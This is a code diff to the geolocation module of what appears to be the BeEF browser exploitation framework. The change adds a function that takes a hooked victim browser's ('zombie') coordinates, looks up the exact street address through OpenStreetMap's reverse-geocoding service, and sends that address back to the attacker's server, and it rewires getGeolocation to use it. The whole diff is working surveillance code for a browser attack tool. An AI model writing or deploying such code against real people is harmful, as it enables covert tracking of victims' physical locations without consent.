@@ -13,6 +13,26 @@ beef.geolocation = {
     },
 
     /*
+     * given latitude/longitude retrieves exact street position of the zombie
+     */
+    getOpenStreetMapAddress: function(command_url, command_id, latitude, longitude){
+        beef.net.request(
+			 'http://nominatim.openstreetmap.org/reverse?format=json&lat=' + latitude + '&lon=' + longitude + '&zoom=18&addressdetails=1',
+		     'GET',
+			 function(response) {
+                 if(response.length > 0) {
+                     var jsonData = JSON.parse(response);
+                     beef.net.sendback(command_url, command_id, "latitude=" + latitude
+                             + "&longitude=" + longitude
+                             + "&openStreetMap=" + escape(jsonData.display_name)
+                             + "&geoLocEnabled=True");
+                 }
+             },
+			 ''
+        );
+    },
+
+    /*
      * retrieve latitude/longitude using the geolocation API
      */
     getGeolocation: function (command_url, command_id){
@@ -26,7 +46,7 @@ beef.geolocation = {
 			function(position){ // success
 				var latitude = position.coords.latitude;
         		var longitude = position.coords.longitude;
-                beef.net.sendback(command_url, command_id, "geoLocEnabled=true&latitude=" + latitude + "&longitude=" + longitude + "&geoLocEnabled=True");
+                beef.geolocation.getOpenStreetMapAddress(command_url, command_id, latitude, longitude);
 
 			}, function(error){ // failure
 					switch(error.code) // Returns 0-3
